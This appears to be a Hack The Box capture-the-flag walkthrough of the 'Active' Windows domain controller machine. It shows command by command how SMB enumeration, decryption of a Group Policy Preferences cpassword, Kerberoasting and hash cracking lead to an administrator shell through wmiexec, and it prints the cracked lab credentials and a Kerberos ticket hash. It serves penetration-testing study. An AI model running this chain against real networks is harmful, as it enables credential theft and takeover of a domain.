@@ -1,0 +1,232 @@
+Abusing Common Windows Mis-configurations (Hack The Box — Active)
+
+Active is a machine challenge from HackTheBox.com
+Introduction
+
+Another blast from the past! This box is several years old but I decided to revisit a few windows boxes in preparation for the OSCP exam. This challenge covers some of the basic essentials of windows enumeration using rpc, smb, DNS and Active Directory.
+
+Techniques and Vulnerabilities covered:
+
+    Anonymous access to Windows shares
+    Exploitation of Group Policy Preferences
+    Kerberoasting
+
+Reconnaissance
+
+As with any machine released on HTB, we generally start out with an nmap scan. This time, we are presented with a huge potential attack surface.
+
+nmap -Pn -sC -sV -oA nmap/quick 10.129.178.216
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 16:02 ADT
+Nmap scan report for 10.129.178.216
+Host is up (0.10s latency).
+Not shown: 983 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-26 19:03:18Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-05-26T19:04:14
+|_  start_date: 2023-05-26T18:52:20
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.12 seconds
+
+One of the big challenges when presented with so many options is where to begin. But, we do learn that there’s an LDAP response indicating a domain called active.htb. Let’s use this and begin to enumerate the DNS service
+DNS Enumeration
+
+We point dnsrecon at the active service on port 53. This tool will attempt to perform a zone transfer, which, if successful, will disclose all of the DNS entries in the database.
+
+dnsrecon -d active.htb -n 10.129.178.216 -a     
+[*] std: Performing General Enumeration against: active.htb...
+[*] Checking for Zone Transfer for active.htb name servers
+[*] Resolving SOA Record
+[+]      SOA dc.active.htb 10.129.178.216
+[+]      SOA dc.active.htb dead:beef::1920:f579:b78c:76ac
+[*] Resolving NS Records
+[*] NS Servers found:
+[+]      NS dc.active.htb 10.129.178.216
+[+]      NS dc.active.htb dead:beef::1920:f579:b78c:76ac
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 10.129.178.216
+[+] 10.129.178.216 Has port 53 TCP Open
+[-] Zone Transfer Failed (Zone transfer error: REFUSED)
+[*]  
+[*] Trying NS server dead:beef::1920:f579:b78c:76ac
+[-] Zone Transfer Failed for dead:beef::1920:f579:b78c:76ac!
+[-] Port 53 TCP is being filtered
+[*] Checking for Zone Transfer for active.htb name servers
+[*] Resolving SOA Record
+[+]      SOA dc.active.htb 10.129.178.216
+[+]      SOA dc.active.htb dead:beef::1920:f579:b78c:76ac
+[*] Resolving NS Records
+[*] NS Servers found:
+[+]      NS dc.active.htb 10.129.178.216
+[+]      NS dc.active.htb dead:beef::1920:f579:b78c:76ac
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 10.129.178.216
+[+] 10.129.178.216 Has port 53 TCP Open
+[-] Zone Transfer Failed (Zone transfer error: REFUSED)
+[*]  
+[*] Trying NS server dead:beef::1920:f579:b78c:76ac
+[-] Zone Transfer Failed for dead:beef::1920:f579:b78c:76ac!
+[-] Port 53 TCP is being filtered
+[-] Could not resolve domain: active.htb
+
+It turns out this DNS service is configured to block zone transfer attacks. Let’s continue to enumerate.
+SMB Enumeration
+
+Enum4linux is a great tool for automating the enumeration of windows machines, I like to run it in verbose mode so I can see more details on the types of queries it is running.
+
+enum4linux -v active.htb
+
+==================================( Share Enumeration on active.htb )==================================                                                  
+                                                                             
+                                                                             
+[V] Attempting to get share list using authentication                        
+                                                                             
+do_connect: Connection to active.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on active.htb                
+
+<snip>
+
+V] Attempting map to share //active.htb/Replication with command: smbclient -W 'WORKGROUP' //'active.htb'/'Replication' -U''%'' -c dir 2>&1              
+                                                                             
+//active.htb/Replication        Mapping: OK Listing: OK Writing: N/A   
+
+</snip>
+
+I’ve included the tastiest bits from the output of enum4linux above… there are two interesting network shares on this machine: Replication and Users
+
+We also learn that we can map to Replication with a null user and password using the following command
+
+smbclient -W 'WORKGROUP' //'active.htb'/'Replication' -U''%''
+
+We can either browse around the folders via smbclient or download the entire structure with smbget.
+
+Inside this Replication file, we land on a file called Groups.xml that contains a username svc_tgs and a value called cpassword, which appears to be an encrypted password for this user.
+
+A little googling on this reminds us that cpassword is an AES-Encrypted password, but that Microsoft accidentally published the encryption key used, so we can reverse this without much difficulty using gpp-decrypt
+
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+
+Now that we have a username and password, we are able to use that to connect to the Users share
+
+smbclient -W 'WORKGROUP' //'active.htb'/'Users' -U'svc_tgs'%'GPPstillStandingStrong2k18'
+Try "help" to get a list of possible commands.
+smb: \> ls -al
+NT_STATUS_NO_SUCH_FILE listing \-al
+smb: \> dir
+  .                                  DR        0  Sat Jul 21 11:39:20 2018
+  ..                                 DR        0  Sat Jul 21 11:39:20 2018
+  Administrator                       D        0  Mon Jul 16 07:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 02:06:44 2009
+  Default                           DHR        0  Tue Jul 14 03:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 02:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 01:57:55 2009
+  Public                             DR        0  Tue Jul 14 01:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 12:16:32 2018
+
+The user flag is located in /Users/SVC_TGS/Desktop
+Privilege Escalation
+
+This is pretty straight-forward, but for the purposes of enumeration you can use bloodhound to map out the domain and then use the built-in queries to list users who are “kerberoastable”.
+
+bloodhound-python -d active.htb -ns 10.129.178.216 -c All -u svc_tgs -p GPPstillStandingStrong2k18
+
+In this case, Administrator cooks up nicely and can be served with a fresh side-salad! These tools are available from impacket, which can be installed via git
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+
+└─$ ./GetUserSPNs.py -request active.htb/svc_tgs -dc-ip 10.129.178.216
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 16:06:40.351723  2023-05-26 15:53:10.138522             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65691efaf36c65bf2ce0f8df97c755d8$2b6f766ca942cd87e2c13244b34bd32eeb2cbff4107a5cf7355b163e91710529fc76fdb7d96e1ef512f661a64616e860e7272eda17bf0add2503599edf6067634bf935fd2740ff3040840b17bc6c699d09837da3f905bbacbf5c614034e38d76fc39ef5aadef9506a7a9e4f16ccaa05fb089cf1b748d09c31bebfc9403ea7b3f14b77b214b8623d3b44bd304f8cc2822905ed9432178ee4ce89017931da2821ebf9f532cb795589c0b437bbb690616e3fa5cc1d610630a442a9df751d3c6f5cccecb5e54e055c16aa3f6d30f2d248a800c4a281208d509746ead8c7dd0c54759e40b33e6d4b47d19e91aa36e7c99d17f4e5979fa919c079d0a7e4a460f43ba4df389c01635e69541a4d0c40a4d9d8033b60f9b2d29a6a6b3079cef4572ba4168ae62729fcbdff551bc63e2f820ffae591983d225032b3cc5806ad22b82cd030f053a9d5bf9662e1f4dcafa90d0d682461899c6f8e7597720c658967b43d6875907662cd31bc1c7cc0f76f8851e30c450a06f5f6cca75cb53267a6d4956f41f41036d33aa07692ad046f9b9973ba332bde5a68ca3110bc7421c425c0d6405c96146e55b05726f6ee9ee475456eda488f6afb675acdee6f148adacbe7f8a11eb98bd85fe63afe18e6262b060f08acc01391ef6682071a3dcacd3946dfee59ad98e4586fa29459425b22064a7faa0b9d3d4f3adf1a753fcdc8968dab95ce4b72b3cd3d3005bdfa462d26a0a9181205fcf293f38cb07ac3124bb1db03a411cabbdb2d1a46795c783234ae93469d0f394cf37c4619fa639b0997f11ac9387f538130be8ad1d85160a428dfc1462d9db614b8181a02f495314967521d97265817b43e0bb4024fe7f130d73bd85d9544feb9bdf0b8ca192a312e72596ede989e6ae12679d573598e57d00b9c8c5f41d15af704dc71b030a960a29feb6766fc6fe95ad099be004c02ba9a28b6b2ec9e91e3561020622d58ff45177f88d088a612c06c7358b6a7843a7e9ce99daf0a5b4d0def66f051a4239089e452a1f041f747c66ff7710605f1e2aa2a0c31285bcbb90b38e2ada18585db3aae35950f14d916d12519e5dae0c464e2876bfae937ec23c5eb459f9a3f321924114c917ecaf8f91f7095f81ae5dc72c54d2aafa0d7555b0d23ac5f1f7436fd44162baec0112ea1700bfb28f492319890200e0615d6e9292a6c302beb7a93d93bcaccf2fffa68cc60f20d3905c1a1437b7ef65c9e84cfcc66066a413357fcd0f3296236f20
+
+Now that we have the key, it can be cracked quickly using JTR
+
+john --format:krb5tgs admin.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /home/backspace/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:04 DONE (2023-05-27 11:12) 0.2100g/s 2214Kp/s 2214Kc/s 2214KC/s TinyMutt69..Teacher21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Finally, we log on as Administrator using another Impacket tool called wmiexec.py
+
+└─$ /home/backspace/tools/impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.178.216
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+active\administrator
+
+C:\Users\Administrator\Desktop>dir
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute wmiexec.py again with -codec and the corresponding codec
+ Volume in drive C has no label.
+ Volume Serial Number is 15BB-D59C
+
+ Directory of C:\Users\Administrator\Desktop
+
+21/01/2021  07:49 ��    <DIR>          .
+21/01/2021  07:49 ��    <DIR>          ..
+26/05/2023  09:52 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   1.135.542.272 bytes free
+
+Conclusions
+
+This machine is an excellent introduction to the core concepts involved in pentesting Windows domains and networks. Even though it was launched several years ago, it still remains a popular challenge within the HTB community and is recommended for those seeking to get their OSCP. The challenge feels more real-world and less of the contrived easter-egg hunts that sometimes makes other challenges frustrating.
